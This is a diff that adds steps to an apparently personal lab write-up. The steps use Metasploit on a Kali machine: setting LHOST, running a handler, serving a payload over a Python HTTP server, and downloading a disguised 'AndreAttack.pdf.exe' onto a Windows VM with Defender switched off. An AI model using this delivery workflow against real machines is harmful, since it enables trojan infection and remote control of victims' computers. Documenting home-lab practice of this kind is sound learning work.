@@ -50,5 +50,27 @@ Then i applied `options` again to change to my command.
 
 ![6 1](https://github.com/user-attachments/assets/ae64a0ed-617d-4083-b13b-9a15ad35d50d)
 
+### 6.1 In here i configured `LHOST` to set to the attacker machine IP (My kali VM), using the command `set lhost 192.132.69.50`
+
+![7 0](https://github.com/user-attachments/assets/79c46239-1407-438b-892b-da1b4d92c9e2)
+#### As we can see from the image we now have our signed IP.
+![image](https://github.com/user-attachments/assets/c0d81579-a22c-4a12-821e-bae569a21c8f)
+
+### Step 7: Now we type `exploit` so our test machine start executing the malware! ☠️
+![8](https://github.com/user-attachments/assets/d7778d6d-77bb-424b-ae25-a2145fe28fb6)
 
 
+### Step 8: We must setup a quick `HTTP` server on my KALI machine so my test machine can download the malware.
+To setup this **HTTP** server i decided to use **Python**! -> This will allow my target machine(windows vm) to access my KALI machine.
+
+(Note: For this to work i had to go to my Windows Test Machine and disable windows defender and disable **Real time protection**!)
+- Used the command:
+  ```bash
+  python3 -m http.server 9999
+  ```
+  ![9](https://github.com/user-attachments/assets/6aad7439-742e-46aa-aacf-82e7c98798d9)
+
+
+
+### Step10- Now i placed the adress(my VM IP server), into my Windows VM, and we got this result seeing the malware file i created earlier with the name `AndreAttack.pdf.exe`. 
+so i proceeded to download it.
